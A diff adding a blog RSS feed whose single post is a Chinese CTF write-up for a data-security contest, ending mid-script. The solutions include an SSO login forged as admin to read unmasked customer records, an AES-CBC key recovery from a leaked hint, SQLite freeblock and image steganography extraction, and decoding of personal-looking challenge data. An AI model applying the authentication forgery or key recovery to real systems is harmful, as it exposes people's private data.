@@ -1,0 +1,3451 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Frank</title><description>DataSec</description><link>https://acidzang.github.io/</link><language>zh_CN</language><item><title>第三届“数信杯”数据安全大赛WP</title><link>https://acidzang.github.io/posts/ctf-shuxinbei/</link><guid isPermaLink="true">https://acidzang.github.io/posts/ctf-shuxinbei/</guid><description>“数信杯”比赛总结-止步50名</description><pubDate>Sat, 03 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;数据安全&lt;/h2&gt;
+&lt;h2&gt;数据脱敏&lt;/h2&gt;
+&lt;p&gt;题目：现已知该系统的脱敏数据泄漏。请选手对该系统进行数据安全风险评估，找到该系统脆弱点。查询该系统后台客户管理功能模块里&quot;&quot;苏南制造&quot;&quot;脱敏前的明文联系方式与地址，将其使用&quot;&quot;_&quot;&quot;拼接，计算md5值后作为答案提交。 答案标准：若联系方式为15672817896，地址为&quot;&quot;重庆市西京区长寿高路23号&quot;&quot;。按照题目要求，进行拼接为&quot;&quot;15672817896_重庆市西京区长寿高路23号&quot;&quot;，计算md5值为&quot;&quot;fa70b7c16a1fa0ca251db917b060f9c9&quot;&quot;进行答案提交。&lt;br /&gt;
+注册新账号，发现&lt;code&gt;customers.php&lt;/code&gt;可以看到所有用户，但是普通用户只能看到脱敏的数据，发现是sso单点登录，通过构造数据包登录admin用户，定位到“苏南制造”，拼接“14593691106_安徽省建平市南溪巢湖路299号创亿科技有限公司社区4号楼156室”，md5&lt;code&gt;b3e83f2ebc1c3dda81a2b0a0b7dcb19d&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; &quot;userid&quot;: &quot;admin&quot;, &quot;sysuserid&quot;: &quot;1&quot;, &quot;corpurl&quot;: f&quot;{TARGET}/dashboard.php&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;数据存储1&lt;/h3&gt;
+&lt;p&gt;题目：工程师小王为了保证数据的安全存储，开发了对数据处理的程序，但这样的处理方式安全吗?分析程序功能，解密文件获取原始数据，提交第6行第2列数据。&lt;/p&gt;
+&lt;p&gt;解压后为&lt;code&gt;info_19ff9a2.ori.en&lt;/code&gt;和&lt;code&gt;re87a57766&lt;/code&gt;两个文件，发现&lt;code&gt;info_19ff9a2.ori.en&lt;/code&gt;为base64，直接找第6行数据使用CyberChef解码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;MjU3MTA4NzYwNDAgNzE2ODk2MTk4ODI5MDM3NDkzIGFkNzg2MkBiNy5jb20
+25710876040 716896198829037493 ad7862@b7.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;或使用脚本解码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import argparse
+import base64
+import binascii
+import sys
+from pathlib import Path
+
+
+def strip_ws(b: bytes) -&amp;gt; bytes:
+    return b&quot;&quot;.join(b.split())
+
+
+def add_padding(b: bytes) -&amp;gt; bytes:
+    m = len(b) % 4
+    if m:
+        b += b&quot;=&quot; * (4 - m)
+    return b
+
+
+def decode_one(chunk: bytes) -&amp;gt; bytes:
+    &quot;&quot;&quot;
+    Decode one base64 chunk (already a single line or a full stream).
+    Supports standard + urlsafe. Tries strict first, then fallback.
+    &quot;&quot;&quot;
+    s = add_padding(strip_ws(chunk))
+    if not s:
+        return b&quot;&quot;
+
+    # strict standard
+    try:
+        return base64.b64decode(s, validate=True)
+    except (binascii.Error, ValueError):
+        pass
+
+    # strict urlsafe by translating
+    try:
+        t = s.replace(b&quot;-&quot;, b&quot;+&quot;).replace(b&quot;_&quot;, b&quot;/&quot;)
+        t = add_padding(t)
+        return base64.b64decode(t, validate=True)
+    except (binascii.Error, ValueError):
+        pass
+
+    # last resort non-strict
+    try:
+        return base64.b64decode(s, validate=False)
+    except (binascii.Error, ValueError) as e:
+        raise ValueError(str(e)) from e
+
+
+def decode_whole_file(raw: bytes) -&amp;gt; bytes:
+    # treat file as one base64 stream split by whitespace/newlines
+    return decode_one(raw)
+
+
+def decode_linewise(raw: bytes, separator: bytes) -&amp;gt; bytes:
+    out = bytearray()
+    lines = raw.splitlines()
+    for i, line in enumerate(lines, 1):
+        if not line.strip():
+            continue
+        try:
+            out.extend(decode_one(line))
+            out.extend(separator)
+        except ValueError as e:
+            raise ValueError(f&quot;Line {i} decode failed: {e}&quot;) from e
+    return bytes(out)
+
+
+def main():
+    ap = argparse.ArgumentParser(description=&quot;Universal Base64 decoder (whole-file or per-line).&quot;)
+    ap.add_argument(&quot;infile&quot;, help=&quot;Input file path&quot;)
+    ap.add_argument(&quot;-o&quot;, &quot;--out&quot;, help=&quot;Output file path (default: stdout)&quot;)
+    ap.add_argument(&quot;--text&quot;, action=&quot;store_true&quot;, help=&quot;Print as UTF-8 text (lossy) to stdout&quot;)
+    ap.add_argument(&quot;--linewise&quot;, action=&quot;store_true&quot;,
+                    help=&quot;Decode each line as an independent base64 chunk&quot;)
+    ap.add_argument(&quot;--sep&quot;, choices=[&quot;none&quot;, &quot;newline&quot;], default=&quot;none&quot;,
+                    help=&quot;When --linewise, separator appended after each decoded line&quot;)
+    args = ap.parse_args()
+
+    raw = Path(args.infile).read_bytes()
+
+    sep = b&quot;&quot; if args.sep == &quot;none&quot; else b&quot;\n&quot;
+
+    if args.linewise:
+        decoded = decode_linewise(raw, sep)
+    else:
+        decoded = decode_whole_file(raw)
+
+    if args.text:
+        sys.stdout.write(decoded.decode(&quot;utf-8&quot;, errors=&quot;replace&quot;))
+        return
+
+    if args.out:
+        Path(args.out).write_bytes(decoded)
+    else:
+        sys.stdout.buffer.write(decoded)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;数据隐藏&lt;/h3&gt;
+&lt;p&gt;题目：某汽车供应链物流中台正在进行季度数据归档，由于归档任务占用了主索引资源，运维团队启用了一套“底层应急索引机制”。该机制并不依赖 SOLite 原生的索引，而是设计了一套自定义的跨页链表协议，将关键筛选逻辑碎片化地存储在数据库文件的物理空闲块(Freeblocks)数据区中。请检査 sys config 表，获取底层链表的入口指针以及自定义链表节点的结构定义。根据结构定义，从底层物理空间中提取并重组出“特定批次货物筛选脚本”(SQL)。隐写数据位于 SQLite Freeblock 的有效载荷区(跳过 Freeblock自身的4字节头部)。数据经过了异或处理，密钥与所在物理页号有关。运行提取出的脚本，定位出该批次雷达模组所在的 集装箱编号(container id)和车牌号(license plate)，最终需要将 container id 和license plate 的后五位数字使用下划线连接提交，例如:CN2877541671 72345。&lt;/p&gt;
+&lt;p&gt;底层应急索引机制：不用 SQLite 原生索引，在数据库文件物理空间的 Freeblocks 区域隐写筛选脚本（SQL），通过一套 跨页链表协议 将 SQL 分片存储，分片数据经过 XOR 处理，密钥与所在 物理页号 有关，链表入口指针与节点结构定义存于 sys_config 表。思路是读取&lt;code&gt;sys_config&lt;/code&gt;找到入口指针与节点结构，从底层物理空间提取分片，按链表拼接并解密，还原 SQL，执行 SQL 得到目标批次的&lt;code&gt;container_id&lt;/code&gt;和&lt;code&gt;license_plate&lt;/code&gt;，提交&lt;code&gt;container_id&lt;/code&gt;与车牌号后五位数字，用下划线连接。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# 读取 sys_config
+$ sqlite3 ./sqlite.db &quot;SELECT config_key, config_val FROM sys_config WHERE config_val LIKE &apos;%:%&apos; OR config_key LIKE &apos;%ptr%&apos; OR config_key LIKE &apos;%entry%&apos; OR config_key LIKE &apos;%head%&apos;;&quot;
+recovery.pointer|ERR_PTR: 0000013B:04F0                                 
+recovery.structure|Struct: &amp;gt;IHH (NextPage, NextOff, Len)
+# 入口指针：0000013B:04F0，表示链表第一个节点在 page=0x13B，offset=0x04F0，config_val 里带 ERR_PTR: 前缀，需要提取真正的 hex:hex
+# 节点结构：&amp;gt;IHH（大端）,NextPage：4 字节无符号整型,NextOff：2 字节无符号整型,Len：2 字节无符号整型
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import argparse
+import re
+import sqlite3
+import struct
+from pathlib import Path
+from typing import Tuple, Optional
+
+
+PTR_RE = re.compile(r&apos;(0x)?[0-9a-fA-F]{1,8}\s*:\s*(0x)?[0-9a-fA-F]{1,4}&apos;)
+STRUCT_RE = re.compile(r&apos;&amp;gt;\s*I\s*H\s*H&apos;, re.IGNORECASE)
+
+
+def read_page_size(db_path: Path) -&amp;gt; int:
+    &quot;&quot;&quot;Read SQLite page size from database header.&quot;&quot;&quot;
+    with db_path.open(&quot;rb&quot;) as f:
+        header = f.read(100)
+    if header[:16] != b&quot;SQLite format 3\x00&quot;:
+        raise ValueError(&quot;Not a SQLite3 database file.&quot;)
+    page_size = struct.unpack(&quot;&amp;gt;H&quot;, header[16:18])[0]
+    return 65536 if page_size == 1 else page_size
+
+
+def parse_entry_ptr(text: str) -&amp;gt; Tuple[int, int]:
+    &quot;&quot;&quot;
+    Parse pointer formats like:
+      0000013B:04F0
+      0x13B:0x4F0
+      13B:4F0
+    &quot;&quot;&quot;
+    s = (text or &quot;&quot;).strip()
+    m = re.match(r&apos;^\s*(0x)?([0-9a-fA-F]{1,8})\s*:\s*(0x)?([0-9a-fA-F]{1,4})\s*$&apos;, s)
+    if not m:
+        raise ValueError(f&quot;Entry pointer not in hex page:off format: {text!r}&quot;)
+    page_hex = m.group(2)
+    off_hex = m.group(4)
+    return int(page_hex, 16), int(off_hex, 16)
+
+
+def extract_ptr_from_config_val(config_val: str) -&amp;gt; str:
+    &quot;&quot;&quot;
+    Extract &apos;page:off&apos; substring from values like:
+      &apos;ERR_PTR: 0000013B:04F0&apos;
+      &apos;pointer=0000013B:04F0&apos;
+    &quot;&quot;&quot;
+    v = (config_val or &quot;&quot;).strip()
+    m = PTR_RE.search(v)
+    if not m:
+        raise ValueError(f&quot;No valid pointer found in config_val: {config_val!r}&quot;)
+    entry = m.group(0).replace(&quot; &quot;, &quot;&quot;)
+    return entry
+
+
+def load_sys_config(db_path: Path) -&amp;gt; Tuple[str, Optional[str]]:
+    &quot;&quot;&quot;
+    Read:
+      - recovery.pointer -&amp;gt; contains entry pointer (maybe with prefix like &apos;ERR_PTR: ...&apos;)
+      - recovery.structure -&amp;gt; contains node struct definition (we expect &amp;gt;IHH)
+    Returns: (entry_ptr_string, struct_string_or_none)
+    &quot;&quot;&quot;
+    conn = sqlite3.connect(str(db_path))
+    conn.row_factory = sqlite3.Row
+    cur = conn.cursor()
+
+    # 必须存在 sys_config 表
+    rows = cur.execute(&quot;SELECT name FROM sqlite_master WHERE type=&apos;table&apos; AND name=&apos;sys_config&apos;&quot;).fetchall()
+    if not rows:
+        raise RuntimeError(&quot;Table sys_config not found.&quot;)
+
+    # 读取两条关键配置
+    ptr_row = cur.execute(
+        &quot;SELECT config_val FROM sys_config WHERE config_key=&apos;recovery.pointer&apos; LIMIT 1&quot;
+    ).fetchone()
+    if not ptr_row:
+        raise RuntimeError(&quot;sys_config missing key: recovery.pointer&quot;)
+
+    struct_row = cur.execute(
+        &quot;SELECT config_val FROM sys_config WHERE config_key=&apos;recovery.structure&apos; LIMIT 1&quot;
+    ).fetchone()
+
+    entry = extract_ptr_from_config_val(ptr_row[&quot;config_val&quot;])
+    struct_text = struct_row[&quot;config_val&quot;] if struct_row else None
+
+    conn.close()
+    return entry, struct_text
+
+
+def xor_with_page(data: bytes, page_no: int) -&amp;gt; bytes:
+    &quot;&quot;&quot;XOR decrypt payload with 4-byte big-endian page number (cycled).&quot;&quot;&quot;
+    key = struct.pack(&quot;&amp;gt;I&quot;, page_no)
+    return bytes(b ^ key[i % 4] for i, b in enumerate(data))
+
+
+def read_at(db_path: Path, page_size: int, page_no: int, off: int, n: int) -&amp;gt; bytes:
+    &quot;&quot;&quot;Read n bytes at (page_no, off) where page_no is 1-based.&quot;&quot;&quot;
+    base = (page_no - 1) * page_size
+    with db_path.open(&quot;rb&quot;) as f:
+        f.seek(base + off)
+        return f.read(n)
+
+
+def extract_sql_by_chain(db_path: Path, entry_page: int, entry_off: int, max_nodes: int = 10000) -&amp;gt; bytes:
+    &quot;&quot;&quot;
+    Node layout at (page, off):
+      header: &amp;gt;IHH  (NextPage, NextOff, Len)  total 8 bytes
+      payload: Len bytes (XOR encrypted with page_no)
+    &quot;&quot;&quot;
+    page_size = read_page_size(db_path)
+
+    chunks = []
+    seen = set()
+    cur_page, cur_off = entry_page, entry_off
+
+    for idx in range(max_nodes):
+        if (cur_page, cur_off) in seen:
+            raise RuntimeError(f&quot;Loop detected in linked list at node#{idx} ({cur_page},0x{cur_off:04X}).&quot;)
+        seen.add((cur_page, cur_off))
+
+        hdr = read_at(db_path, page_size, cur_page, cur_off, 8)
+        if len(hdr) &amp;lt; 8:
+            raise RuntimeError(f&quot;Failed to read node header at ({cur_page},0x{cur_off:04X}).&quot;)
+
+        next_page, next_off, length = struct.unpack(&quot;&amp;gt;IHH&quot;, hdr)
+
+        enc = read_at(db_path, page_size, cur_page, cur_off + 8, length)
+        if len(enc) &amp;lt; length:
+            raise RuntimeError(f&quot;Failed to read payload at ({cur_page},0x{cur_off:04X}), need {length}, got {len(enc)}.&quot;)
+
+        dec = xor_with_page(enc, cur_page)
+        chunks.append(dec)
+
+        if next_page == 0 or next_off == 0:
+            break
+
+        cur_page, cur_off = next_page, next_off
+    else:
+        raise RuntimeError(&quot;Too many nodes, aborting.&quot;)
+
+    return b&quot;&quot;.join(chunks)
+
+
+def normalize_sql(raw: bytes) -&amp;gt; str:
+    &quot;&quot;&quot;
+    Turn extracted bytes into text SQL:
+    - strip NULLs
+    - decode as UTF-8 with replacement
+    &quot;&quot;&quot;
+    cleaned = raw.replace(b&quot;\x00&quot;, b&quot;&quot;)
+    return cleaned.decode(&quot;utf-8&quot;, errors=&quot;replace&quot;).strip()
+
+
+def run_extracted_sql(db_path: Path, sql_text: str):
+    &quot;&quot;&quot;
+    Execute extracted SQL script; if it includes a SELECT, try to print rows.
+    &quot;&quot;&quot;
+    conn = sqlite3.connect(str(db_path))
+    cur = conn.cursor()
+    try:
+        # 执行脚本（允许多语句）
+        cur.executescript(sql_text)
+
+        # 尝试找最后一条 SELECT 并执行 fetch
+        last_select = None
+        parts = [p.strip() for p in sql_text.split(&quot;;&quot;) if p.strip()]
+        for p in parts[::-1]:
+            if re.search(r&apos;^\s*select\b&apos;, p, re.IGNORECASE):
+                last_select = p
+                break
+
+        if last_select:
+            rows = cur.execute(last_select).fetchall()
+            print(&quot;[+] last SELECT rows:&quot;)
+            for r in rows:
+                print(r)
+        else:
+            print(&quot;[*] script executed (no trailing SELECT detected).&quot;)
+    finally:
+        conn.close()
+
+
+def main():
+    ap = argparse.ArgumentParser(description=&quot;Extract hidden SQL from custom freeblock linked list.&quot;)
+    ap.add_argument(&quot;db&quot;, help=&quot;sqlite db file path&quot;)
+    ap.add_argument(&quot;--entry&quot;, help=&quot;manual entry pointer like 0000013B:04F0 (override sys_config)&quot;)
+    ap.add_argument(&quot;--out&quot;, default=&quot;extracted.sql&quot;, help=&quot;output sql file&quot;)
+    ap.add_argument(&quot;--run&quot;, action=&quot;store_true&quot;, help=&quot;execute extracted SQL and print result&quot;)
+    args = ap.parse_args()
+
+    db_path = Path(args.db).expanduser().resolve()
+    if not db_path.exists():
+        raise SystemExit(f&quot;DB not found: {db_path}&quot;)
+
+    if args.entry:
+        entry = args.entry.strip()
+        struct_text = None
+    else:
+        entry, struct_text = load_sys_config(db_path)
+
+    # 校验结构定义
+    if struct_text is not None:
+        if not STRUCT_RE.search(struct_text):
+            print(f&quot;[!] Warning: recovery.structure looks unexpected: {struct_text!r} (script assumes &amp;gt;IHH)&quot;)
+
+    entry_page, entry_off = parse_entry_ptr(entry)
+
+    raw = extract_sql_by_chain(db_path, entry_page, entry_off)
+    sql_text = normalize_sql(raw)
+
+    Path(args.out).write_text(sql_text, encoding=&quot;utf-8&quot;)
+    print(f&quot;[+] entry={entry} -&amp;gt; page={entry_page} off=0x{entry_off:04X}&quot;)
+    print(f&quot;[+] wrote SQL to: {args.out}&quot;)
+    print(&quot;----- extracted SQL preview (first 800 chars) -----&quot;)
+    print(sql_text[:800])
+    print(&quot;----- end preview -----&quot;)
+
+    if args.run:
+        run_extracted_sql(db_path, sql_text)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;执行脚本，取出flag，CN2888991777_52816&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ python extract_emergency_sql.py ./sqlite.db --out extracted.sql
+
+$ sqlite3 -header -column ./sqlite.db &amp;lt; extracted.sql
+container_id  license_plate
+------------  -------------
+CN2888991777  粤B-52816 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;数据加密&lt;/h3&gt;
+&lt;p&gt;题目：某加密产品采用标准算法进行数据安全防护，某安全研究员通过逆向分析得到该产品的代码后发现，这段代码模拟了某商用密码库接口中可能存在的双重填充场景。请分析题目提供的代码文件，基于截获的密文及侧信道数据，恢复原始数据。
+分析题目提供的&lt;code&gt;task.py&lt;/code&gt;文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import os
+from Crypto.Util.number import *
+from Crypto.Cipher import AES
+from secret import flag, key
+from Crypto.Util.Padding import pad
+
+assert(len(flag) == 38)
+assert flag[:5] == b&apos;flag{&apos; and flag[-1:] == b&apos;}&apos;
+assert(len(key) == 16)90
+
+def padding(msg):
+    tmp = 16 - len(msg) % 16
+    pad = format(tmp, &apos;02x&apos;)
+    return bytes.fromhex(pad * tmp) + msg
+message = padding(flag)
+hint = bytes_to_long(key) ^ bytes_to_long(message[:16])
+message = pad(message, 16, &apos;pkcs7&apos;)
+IV = os.urandom(16)
+encryption = AES.new(key, AES.MODE_CBC, iv=IV)
+enc = encryption.encrypt(message)
+
+print(&apos;enc =&apos;, enc.hex())
+print(&apos;hint =&apos;, hex(hint)[2:])
+
+# enc = 1ce1df3812668ce0bccd86c146cc56989681e128edd0676f5d26e01abdee90c860e22a5a491f94ac5ca3ab02242740fb8c35a3b60ea737ca0d2662fba2b0e299
+# hint = 32393f4e3c3c4f3e323a512a5356437d
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;代码做了双重填充，自定义&lt;code&gt;padding(msg)&lt;/code&gt;，&lt;code&gt;tmp = 16 - len(msg) % 16&lt;/code&gt;，返回&lt;code&gt;bytes([tmp])*tmp + msg&lt;/code&gt;（前置填充）,再对上一步的结果做一次标准 &lt;code&gt;PKCS#7&lt;/code&gt; 后置填充&lt;code&gt;pad(message, 16, &apos;pkcs7&apos;)&lt;/code&gt;，用 AES-CBC 随机 IV 加密，但没有输出 IV。&lt;br /&gt;
+可利用点为&lt;code&gt;hint 泄漏 + 首块明文可预测&lt;/code&gt;，已知&lt;code&gt;len(flag)=38&lt;/code&gt;，所以&lt;code&gt;tmp = 16 - (38 mod 16) = 16 - 6 = 10&lt;/code&gt;，前置填充就是&lt;code&gt;0x0a&lt;/code&gt;重复10字节，因而首块明文 &lt;code&gt;P1 = 0x0a*10 + flag[:6]&lt;/code&gt;；又已知flag固定前缀 &lt;code&gt;flag{&lt;/code&gt;，所以&lt;code&gt;flag[:6] = b&quot;flag{&quot; + x&lt;/code&gt;，只有第6个字节&lt;code&gt;x&lt;/code&gt;不确定（1 字节，256 种），而&lt;code&gt;hint = key ⊕ P1&lt;/code&gt;(（按 16 字节整块异或）)，所以只要枚举&lt;code&gt;x&lt;/code&gt;，就能恢复完整&lt;code&gt;key&lt;/code&gt;。&lt;br /&gt;
+&lt;code&gt;P1 = Dec_k(C1) ⊕ IV&lt;/code&gt;，所以&lt;code&gt;IV = Dec_k(C1) ⊕ P1&lt;/code&gt;，枚举出正确的&lt;code&gt;key&lt;/code&gt;与&lt;code&gt;P1&lt;/code&gt;后，就能算出&lt;code&gt;IV&lt;/code&gt;，然后解密整个密文，再做&lt;code&gt;PKCS#7 unpad&lt;/code&gt;，最后去掉前置的&lt;code&gt;0x0a*10&lt;/code&gt; 得到原 flag。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+
+ENC_HEX  = &quot;1ce1df3812668ce0bccd86c146cc56989681e128edd0676f5d26e01abdee90c860e22a5a491f94ac5ca3ab02242740fb8c35a3b60ea737ca0d2662fba2b0e299&quot;
+HINT_HEX = &quot;32393f4e3c3c4f3e323a512a5356437d&quot;
+
+def bxor(a: bytes, b: bytes) -&amp;gt; bytes:
+    return bytes(x ^ y for x, y in zip(a, b))
+
+def main():
+    enc  = bytes.fromhex(ENC_HEX)
+    hint = bytes.fromhex(HINT_HEX)
+
+    # 由于 len(flag)=38 =&amp;gt; tmp=10 =&amp;gt; 前置 0x0a*10
+    prefix_pad = bytes([0x0a]) * 10
+    known = b&quot;flag{&quot;
+    C1 = enc[:16]
+
+    for x in range(256):
+        # P1 = 0x0a*10 + b&quot;flag{&quot; + x
+        P1 = prefix_pad + known + bytes([x])
+
+        # key = hint xor P1
+        key = bxor(hint, P1)
+
+        # 用 key 解出 Dec_k(C1)，从而算出 IV
+        D1 = AES.new(key, AES.MODE_ECB).decrypt(C1)
+        iv = bxor(D1, P1)
+
+        # 用 key+iv 解密整段
+        pt = AES.new(key, AES.MODE_CBC, iv=iv).decrypt(enc)
+
+        # 验证 PKCS7 padding
+        try:
+            pt2 = unpad(pt, 16, style=&quot;pkcs7&quot;)
+        except ValueError:
+            continue
+
+        # 去掉前置填充，得到 flag
+        if len(pt2) &amp;gt;= 10 and pt2.startswith(prefix_pad):
+            flag = pt2[10:]
+            if len(flag) == 38 and flag.startswith(b&quot;flag{&quot;) and flag.endswith(b&quot;}&quot;):
+                print(&quot;guess x =&quot;, x, &quot;chr =&quot;, repr(bytes([x])))
+                print(&quot;key      =&quot;, key)
+                print(&quot;iv       =&quot;, iv.hex())
+                print(&quot;flag     =&quot;, flag.decode(&quot;utf-8&quot;, errors=&quot;replace&quot;))
+                return
+
+    print(&quot;No solution found.&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;guess x = 73 chr = b&apos;I&apos;
+key      = b&apos;835D66E4807F2184&apos;
+iv       = 8e3f1bd4fc5e355ee7f42faf0718491e
+flag     = flag{IADMIN-TOP-18880101-7634567_2025}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;数据泄漏&lt;/h3&gt;
+&lt;p&gt;题目：分析题目附件，获取陈淑华编号信息进行提交&lt;br /&gt;
+从附件密文（Base64 字符串）解码：姓名：陈淑华，编号：S20251001&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;5aeT5ZCNOumZiOa3keWNjiznvJblj7c6UzIwMjUxMDAxLOi6q+S7veivgeWPt+eggTo0NDE4ODEyMDAwMDUwMzY0NTA=
+姓名:陈淑华,编号:S20251001,身份证号码:441881200005036450
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;数据隐写&lt;/h3&gt;
+&lt;p&gt;题目：某黑客团伙将核心机密（flag）隐藏在一张普通图片中，并通过多模态 AI 模型建立了 “图片特征→流量特征” 的映射关系。该模型可将图片中的隐写特征转换为流量特征，而这些流量特征直接编码了 flag。现提供图片、AI 模型及提示信息，请你破解隐写信息，调用模型转换特征，最终还原出 flag。&lt;br /&gt;
+隐写规则提示：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;隐写规则提示：
+1. 图片的红色（R）通道中隐藏了模型输入特征；
+2. 取图片左上角前20个像素的R值，计算 R值 mod 10 得到20维特征；
+3. 20维特征输入multimodal_model.pth模型后，输出的数值取整即为flag的ASCII码；
+4. ASCII码转换为字符即可得到完整flag。
+
+模型提示：
+- 模型为轻量全连接神经网络（MLP），仅含3层线性层+ReLU激活。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;根据隐写规则提示，直接通过AI写代码实现&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import torch
+import torch.nn as nn
+from PIL import Image
+import numpy as np
+
+
+class MLP(nn.Module):
+    def __init__(self):
+        super(MLP, self).__init__()
+        self.fc1 = nn.Linear(20, 64)
+        self.relu = nn.ReLU()
+        self.fc2 = nn.Linear(64, 32)
+        self.fc3 = nn.Linear(32, 27)
+
+    def forward(self, x):
+        x = self.relu(self.fc1(x))
+        x = self.relu(self.fc2(x))
+        return self.fc3(x)
+
+
+def solve():
+    img = Image.open(&apos;secret_image.png&apos;).convert(&apos;RGB&apos;)
+    model = MLP()
+    model.load_state_dict(torch.load(&apos;multimodal_model.pth&apos;, weights_only=False))
+    model.eval()
+
+    # 尝试两种提取方式
+    # 方式 A: 横向 (Row-wise)
+    pixels_h = [img.getpixel((i, 0))[0] for i in range(20)]
+    # 方式 B: 纵向 (Column-wise)
+    pixels_v = [img.getpixel((0, i))[0] for i in range(20)]
+
+    for name, p_list in [(&quot;横向读取&quot;, pixels_h), (&quot;纵向读取&quot;, pixels_v)]:
+        # 计算 R mod 10
+        feat = torch.tensor([float(p % 10) for p in p_list], dtype=torch.float32).unsqueeze(0)
+
+        with torch.no_grad():
+            output = model(feat).squeeze()
+
+            # 尝试不同的取整方式
+            for method in [torch.round, torch.floor, torch.ceil]:
+                chars = &quot;&quot;.join([chr(int(c)) for c in method(output)])
+                print(f&quot;{name} - {method.__name__}: {chars}&quot;)
+
+
+solve()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;不同拼接得到结果，确认&lt;code&gt;flag{A12I_shu1xin2bei_2025}&lt;/code&gt;为答案。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;横向读取 - round: ag\au&amp;gt;//EZmco.rdi/]`cZ0-/2w
+横向读取 - floor: `f[at=./EZmbo.qch/]_cZ/-/2v
+横向读取 - ceil: ag\bu&amp;gt;/0F[ncp/rdi0^`d[0.03w
+纵向读取 - round: flag{A12I_shu1xin2bei_2025}
+纵向读取 - floor: el`f{A11I_sht1xhn2aeh_1015}
+纵向读取 - ceil: flag|A22I`siu1xio2bei_2025~
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;数据分析&lt;/h2&gt;
+&lt;h3&gt;数据处理&lt;/h3&gt;
+&lt;h4&gt;题目1:&lt;/h4&gt;
+&lt;p&gt;第一天上班的你去查看公司的流量监控记录，发现了一串非常奇怪的流量信息，你一眼就判断出这是黑客攻击所产生的流量，你向上级报告后，上级让你查清黑客取了什么数据。你需要提交泄露的管理员的账号密码，例:管理员账号密码为123/123，则最终提交的答案为:123/123。&lt;/p&gt;
+&lt;p&gt;通过&lt;code&gt;Wireshark&lt;/code&gt;打开&lt;code&gt;attack.pcapng&lt;/code&gt;数据包，检查&lt;code&gt;http.request.uri == &quot;/login&quot;&lt;/code&gt;访问登录接口的数据包，发现&lt;code&gt;302&lt;/code&gt;，找到&lt;code&gt;username=admin&amp;amp;password=Adm1n%402024%23Secure%21Pass&lt;/code&gt;，按题目要求flag为&lt;code&gt;admin/Adm1n@2024#Secure!Pass&lt;/code&gt;。&lt;/p&gt;
+&lt;h4&gt;题目2:&lt;/h4&gt;
+&lt;p&gt;与你交接的同事由于工作上的疏忽将原先的居民信息文件误删除了，但是你发现公司的系统上依旧存在居民的信息，下载后发现进行了脱敏处理，你需要利用技术手段将居民信息快速整理出来。你需要提交手机号为18896239239的家庭住址，例：手机号为18896239239的家庭住址为青海省沈阳市合川徐街9号，则最终提交的答案为：青海省沈阳市合川徐街9号。  、&lt;/p&gt;
+&lt;p&gt;分析发现&lt;code&gt;居民信息表.csv&lt;/code&gt;为base64加码，直接通过脚本解码后按照要求提交即可。&lt;code&gt;江苏省兰州县静安阜新街19号&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+&quot;&quot;&quot;
+csv_b64_decode_to_xlsx.py
+
+Read a CSV file, try Base64-decode every cell, and export to an Excel .xlsx file.
+
+Behavior:
+- For each cell: if it looks like Base64, attempt decode -&amp;gt; UTF-8 string.
+- If a cell does not look like Base64, or decode fails, keep the original cell value.
+- Preserve original row/column layout.
+
+Dependencies:
+- pandas
+- openpyxl
+&quot;&quot;&quot;
+
+from __future__ import annotations
+
+import argparse
+import base64
+import os
+import re
+from typing import Any
+
+import pandas as pd
+
+__all__ = [&quot;main&quot;]
+
+_B64_RE = re.compile(r&quot;^[A-Za-z0-9+/=]+$&quot;)
+
+
+def _is_likely_base64(s: str) -&amp;gt; bool:
+    t = (s or &quot;&quot;).strip()
+    if len(t) &amp;lt; 4:
+        return False
+    if len(t) % 4 != 0:
+        return False
+    if not _B64_RE.fullmatch(t):
+        return False
+    # Too many &apos;=&apos; in the middle is suspicious; allow only as padding at the end.
+    if &quot;=&quot; in t[:-2]:
+        return False
+    return True
+
+
+def _try_b64_decode_cell(val: Any, text_encoding: str) -&amp;gt; str:
+    if val is None:
+        return &quot;&quot;
+    s = str(val)
+    if s == &quot;&quot;:
+        return &quot;&quot;
+
+    if not _is_likely_base64(s):
+        return s
+
+    try:
+        raw = base64.b64decode(s, validate=False)
+        return raw.decode(text_encoding, errors=&quot;replace&quot;)
+    except Exception:
+        return s
+
+
+def main() -&amp;gt; int:
+    ap = argparse.ArgumentParser(
+        description=&quot;Decode Base64 cells in CSV and export to XLSX.&quot;)
+    ap.add_argument(&quot;-i&quot;, &quot;--input&quot;, required=True, help=&quot;Input CSV path.&quot;)
+    ap.add_argument(
